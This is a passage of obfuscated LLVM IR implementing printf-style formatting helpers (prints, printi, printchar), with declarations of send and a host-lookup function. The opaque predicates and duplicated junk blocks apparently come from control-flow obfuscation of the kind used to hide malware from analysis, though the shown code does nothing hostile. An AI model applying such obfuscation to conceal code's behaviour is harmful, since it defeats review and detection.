  %798 = bitcast i8* %797 to i32*
  %799 = getelementptr i8, i8* %797, i32 8
  store i8* %799, i8** %796, align 8
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %594
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %611
  %800 = load i8**, i8*** %4, align 8
  %801 = load i8*, i8** %5, align 8
  %802 = load i8, i8* %801, align 1
  %803 = zext i8 %802 to i32
  call void @printchar(i8** %800, i32 %803)
  %804 = load i32, i32* %9, align 4
  %_143 = shl i32 %804, 1
  %805 = add nsw i32 %804, 1
  store i32 %805, i32* %9, align 4
  br label %originalBB142

originalBB147alteredBB:                           ; preds = %originalBB147, %634
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %651
  %806 = load i8*, i8** %5, align 8
  %807 = getelementptr inbounds i8, i8* %806, i32 1
  store i8* %807, i8** %5, align 8
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %673
  %808 = load i8**, i8*** %4, align 8
  %809 = load i8*, i8** %808, align 8
  store i8 0, i8* %809, align 1
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %692
  %810 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %811 = bitcast %struct.__va_list_tag* %810 to i8*
  call void @llvm.va_end(i8* %811)
  %812 = load i32, i32* %9, align 4
  br label %originalBB159
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %74

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %originalBBpart2, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* @x.15
  %26 = load i32, i32* @y.16
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %12, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %12, align 8
  %35 = load i32, i32* @x.15
  %36 = load i32, i32* @y.16
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* @x.15
  %45 = load i32, i32* @y.16
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %11, align 4
  %53 = load i32, i32* %7, align 4
  %54 = icmp sge i32 %52, %53
  %55 = load i32, i32* @x.15
  %56 = load i32, i32* @y.16
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %64

; <label>:63:                                     ; preds = %originalBBpart24
  store i32 0, i32* %7, align 4
  br label %68

; <label>:64:                                     ; preds = %originalBBpart24
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* %7, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %7, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %63
  %69 = load i32, i32* %8, align 4
  %70 = and i32 %69, 2
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %68
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %68
  br label %74

; <label>:74:                                     ; preds = %73, %4
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 1
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %155, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @x.15
  %80 = load i32, i32* @y.16
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i32, i32* @x.15
  %88 = load i32, i32* @y.16
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %95

; <label>:95:                                     ; preds = %135, %originalBBpart28
  %96 = load i32, i32* @x.15
  %97 = load i32, i32* @y.16
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = load i32, i32* %7, align 4
  %105 = icmp sgt i32 %104, 0
  %106 = load i32, i32* @x.15
  %107 = load i32, i32* @y.16
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %105, label %114, label %138

; <label>:114:                                    ; preds = %originalBBpart212
  %115 = load i32, i32* @x.15
  %116 = load i32, i32* @y.16
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %114
  %123 = load i8**, i8*** %5, align 8
  %124 = load i32, i32* %10, align 4
  call void @printchar(i8** %123, i32 %124)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %9, align 4
  %127 = load i32, i32* @x.15
  %128 = load i32, i32* @y.16
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart220, label %originalBB14alteredBB

originalBBpart220:                                ; preds = %originalBB14
  br label %135

; <label>:135:                                    ; preds = %originalBBpart220
  %136 = load i32, i32* %7, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %7, align 4
  br label %95

; <label>:138:                                    ; preds = %originalBBpart212
  %139 = load i32, i32* @x.15
  %140 = load i32, i32* @y.16
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %138
  %147 = load i32, i32* @x.15
  %148 = load i32, i32* @y.16
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %155

; <label>:155:                                    ; preds = %originalBBpart224, %74
  br label %156

; <label>:156:                                    ; preds = %167, %155
  %157 = load i8*, i8** %6, align 8
  %158 = load i8, i8* %157, align 1
  %159 = icmp ne i8 %158, 0
  br i1 %159, label %160, label %170

; <label>:160:                                    ; preds = %156
  %161 = load i8**, i8*** %5, align 8
  %162 = load i8*, i8** %6, align 8
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i32
  call void @printchar(i8** %161, i32 %164)
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  br label %167

; <label>:167:                                    ; preds = %160
  %168 = load i8*, i8** %6, align 8
  %169 = getelementptr inbounds i8, i8* %168, i32 1
  store i8* %169, i8** %6, align 8
  br label %156

; <label>:170:                                    ; preds = %156
  %171 = load i32, i32* @x.15
  %172 = load i32, i32* @y.16
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %170
  %179 = load i32, i32* @x.15
  %180 = load i32, i32* @y.16
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %187

; <label>:187:                                    ; preds = %195, %originalBBpart228
  %188 = load i32, i32* %7, align 4
  %189 = icmp sgt i32 %188, 0
  br i1 %189, label %190, label %198

; <label>:190:                                    ; preds = %187
  %191 = load i8**, i8*** %5, align 8
  %192 = load i32, i32* %10, align 4
  call void @printchar(i8** %191, i32 %192)
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %9, align 4
  br label %195

; <label>:195:                                    ; preds = %190
  %196 = load i32, i32* %7, align 4
  %197 = add nsw i32 %196, -1
  store i32 %197, i32* %7, align 4
  br label %187

; <label>:198:                                    ; preds = %187
  %199 = load i32, i32* @x.15
  %200 = load i32, i32* @y.16
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %198
  %207 = load i32, i32* %9, align 4
  %208 = load i32, i32* @x.15
  %209 = load i32, i32* @y.16
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %207

originalBBalteredBB:                              ; preds = %originalBB, %24
  %216 = load i8*, i8** %12, align 8
  %217 = getelementptr inbounds i8, i8* %216, i32 1
  store i8* %217, i8** %12, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %218 = load i32, i32* %11, align 4
  %219 = load i32, i32* %7, align 4
  %220 = icmp sge i32 %218, %219
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %221 = load i32, i32* %7, align 4
  %222 = icmp sgt i32 %221, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %114
  %223 = load i8**, i8*** %5, align 8
  %224 = load i32, i32* %10, align 4
  call void @printchar(i8** %223, i32 %224)
  %225 = load i32, i32* %9, align 4
  %_ = sub i32 %225, 1
  %gen = mul i32 %_, 1
  %_15 = sub i32 %225, 1
  %gen16 = mul i32 %_15, 1
  %_17 = shl i32 %225, 1
  %_18 = shl i32 %225, 1
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %9, align 4
  br label %originalBB14

originalBB22alteredBB:                            ; preds = %originalBB22, %138
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %170
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %198
  %227 = load i32, i32* %9, align 4
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %182

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart219, %45
  %51 = load i32, i32* @x.17
  %52 = load i32, i32* @y.18
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %21, align 4
  %60 = icmp ne i32 %59, 0
  %61 = load i32, i32* @x.17
  %62 = load i32, i32* @y.18
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %60, label %69, label %122

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* @x.17
  %71 = load i32, i32* @y.18
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* %21, align 4
  %79 = load i32, i32* %11, align 4
  %80 = urem i32 %78, %79
  store i32 %80, i32* %18, align 4
  %81 = load i32, i32* %18, align 4
  %82 = icmp sge i32 %81, 10
  %83 = load i32, i32* @x.17
  %84 = load i32, i32* @y.18
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br i1 %82, label %91, label %97

; <label>:91:                                     ; preds = %originalBBpart25
  %92 = load i32, i32* %15, align 4
  %93 = sub nsw i32 %92, 48
  %94 = sub nsw i32 %93, 10
  %95 = load i32, i32* %18, align 4
  %96 = add nsw i32 %95, %94
  store i32 %96, i32* %18, align 4
  br label %97

; <label>:97:                                     ; preds = %91, %originalBBpart25
  %98 = load i32, i32* @x.17
  %99 = load i32, i32* @y.18
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %97
  %106 = load i32, i32* %18, align 4
  %107 = add nsw i32 %106, 48
  %108 = trunc i32 %107 to i8
  %109 = load i8*, i8** %17, align 8
  %110 = getelementptr inbounds i8, i8* %109, i32 -1
  store i8* %110, i8** %17, align 8
  store i8 %108, i8* %110, align 1
  %111 = load i32, i32* %11, align 4
  %112 = load i32, i32* %21, align 4
  %113 = udiv i32 %112, %111
  store i32 %113, i32* %21, align 4
  %114 = load i32, i32* @x.17
  %115 = load i32, i32* @y.18
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart219, label %originalBB7alteredBB

originalBBpart219:                                ; preds = %originalBB7
  br label %50

; <label>:122:                                    ; preds = %originalBBpart2
  %123 = load i32, i32* @x.17
  %124 = load i32, i32* @y.18
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %122
  %131 = load i32, i32* %19, align 4
  %132 = icmp ne i32 %131, 0
  %133 = load i32, i32* @x.17
  %134 = load i32, i32* @y.18
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %132, label %141, label %174

; <label>:141:                                    ; preds = %originalBBpart223
  %142 = load i32, i32* @x.17
  %143 = load i32, i32* @y.18
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %141
  %150 = load i32, i32* %13, align 4
  %151 = icmp ne i32 %150, 0
  %152 = load i32, i32* @x.17
  %153 = load i32, i32* @y.18
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart228, label %originalBB25alteredBB

originalBBpart228:                                ; preds = %originalBB25
  br i1 %151, label %160, label %170

; <label>:160:                                    ; preds = %originalBBpart228
  %161 = load i32, i32* %14, align 4
  %162 = and i32 %161, 2
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %170

; <label>:164:                                    ; preds = %160
  %165 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %165, i32 45)
  %166 = load i32, i32* %20, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %20, align 4
  %168 = load i32, i32* %13, align 4
  %169 = add nsw i32 %168, -1
  store i32 %169, i32* %13, align 4
  br label %173

; <label>:170:                                    ; preds = %160, %originalBBpart228
  %171 = load i8*, i8** %17, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %17, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %164
  br label %174

; <label>:174:                                    ; preds = %173, %originalBBpart223
  %175 = load i32, i32* %20, align 4
  %176 = load i8**, i8*** %9, align 8
  %177 = load i8*, i8** %17, align 8
  %178 = load i32, i32* %13, align 4
  %179 = load i32, i32* %14, align 4
  %180 = call i32 @prints(i8** %176, i8* %177, i32 %178, i32 %179)
  %181 = add nsw i32 %175, %180
  store i32 %181, i32* %8, align 4
  br label %182

; <label>:182:                                    ; preds = %174, %25
  %183 = load i32, i32* @x.17
  %184 = load i32, i32* @y.18
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %182
  %191 = load i32, i32* %8, align 4
  %192 = load i32, i32* @x.17
  %193 = load i32, i32* @y.18
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %191

originalBBalteredBB:                              ; preds = %originalBB, %50
  %200 = load i32, i32* %21, align 4
  %201 = icmp ne i32 %200, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  %202 = load i32, i32* %21, align 4
  %203 = load i32, i32* %11, align 4
  %_ = sub i32 %202, %203
  %gen = mul i32 %_, %203
  %_2 = sub i32 0, %202
  %gen3 = add i32 %_2, %203
  %204 = urem i32 %202, %203
  store i32 %204, i32* %18, align 4
  %205 = load i32, i32* %18, align 4
  %206 = icmp sge i32 %205, 10
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %97
  %207 = load i32, i32* %18, align 4
  %_8 = sub i32 %207, 48
  %gen9 = mul i32 %_8, 48
  %208 = add nsw i32 %207, 48
  %209 = trunc i32 %208 to i8
  %210 = load i8*, i8** %17, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 -1
  store i8* %211, i8** %17, align 8
  store i8 %209, i8* %211, align 1
  %212 = load i32, i32* %11, align 4
  %213 = load i32, i32* %21, align 4
  %_10 = sub i32 0, %213
  %gen11 = add i32 %_10, %212
  %_12 = shl i32 %213, %212
  %_13 = sub i32 0, %213
  %gen14 = add i32 %_13, %212
  %_15 = sub i32 0, %213
  %gen16 = add i32 %_15, %212
  %_17 = shl i32 %213, %212
  %214 = udiv i32 %213, %212
  store i32 %214, i32* %21, align 4
  br label %originalBB7

originalBB21alteredBB:                            ; preds = %originalBB21, %122
  %215 = load i32, i32* %19, align 4
  %216 = icmp ne i32 %215, 0
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %141
  %217 = load i32, i32* %13, align 4
  %218 = icmp ne i32 %217, 0
  br label %originalBB25

originalBB30alteredBB:                            ; preds = %originalBB30, %182
  %219 = load i32, i32* %8, align 4
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %47

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.19
  %25 = load i32, i32* @y.20
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %12, align 4
  %33 = trunc i32 %32 to i8
  %34 = load i8**, i8*** %11, align 8
  %35 = load i8*, i8** %34, align 8
  store i8 %33, i8* %35, align 1
  %36 = load i8**, i8*** %11, align 8
  %37 = load i8*, i8** %36, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %36, align 8
  %39 = load i32, i32* @x.19
  %40 = load i32, i32* @y.20
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %66

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.19
  %49 = load i32, i32* @y.20
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %47
  %56 = bitcast i32* %12 to i8*
  %57 = call i64 @write(i32 1, i8* %56, i64 1)
  %58 = load i32, i32* @x.19
  %59 = load i32, i32* @y.20
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %66

; <label>:66:                                     ; preds = %originalBBpart28, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %67 = alloca i8**, align 8
  %68 = alloca i32, align 4
  store i8** %0, i8*** %67, align 8
  store i32 %1, i32* %68, align 4
  %69 = load i8**, i8*** %67, align 8
  %70 = icmp ne i8** %69, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %71 = load i32, i32* %12, align 4
  %72 = trunc i32 %71 to i8
  %73 = load i8**, i8*** %11, align 8
  %74 = load i8*, i8** %73, align 8
  store i8 %72, i8* %74, align 1
  %75 = load i8**, i8*** %11, align 8
  %76 = load i8*, i8** %75, align 8
  %77 = getelementptr inbounds i8, i8* %76, i32 1
  store i8* %77, i8** %75, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %47
  %78 = bitcast i32* %12 to i8*
  %79 = call i64 @write(i32 1, i8* %78, i64 1)
  br label %originalBB6
}

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
